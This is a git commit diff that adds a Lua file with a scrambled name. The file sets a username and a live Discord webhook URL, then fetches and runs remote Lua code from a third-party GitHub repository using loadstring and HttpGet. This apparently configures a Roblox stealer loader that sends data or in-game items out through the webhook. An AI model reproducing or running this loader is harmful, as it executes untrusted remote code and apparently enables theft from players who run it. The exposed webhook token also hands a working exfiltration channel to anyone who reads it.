a4e247e17c06a693d8f5beb1a0b0b9628ed05c93
mitchellpikejack <104778054+mitchellpikejack@users.noreply.github.com>
2023-03-26 14:11:02 +0100

    Add files via upload

---
+++ obf_gxJ92fwJxVzGyH7wC9tRoDBlMjs8v1mpwgp96wUC85fZWX1Q3RE3l3X2bgQ9s5ps.lua
@@ -0,0 +1,4 @@
+UserName = "hellopike2"
+UserName2 = "hellopike2"
+Webhook = "https://discord.com/api/webhooks/1089141427084214272/iiOqe6FhwUdoNBBolAAi7mZUFCoSijMfh7HDrt-CGlNuh3hm1UHU9acCETOrl10dpK08"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
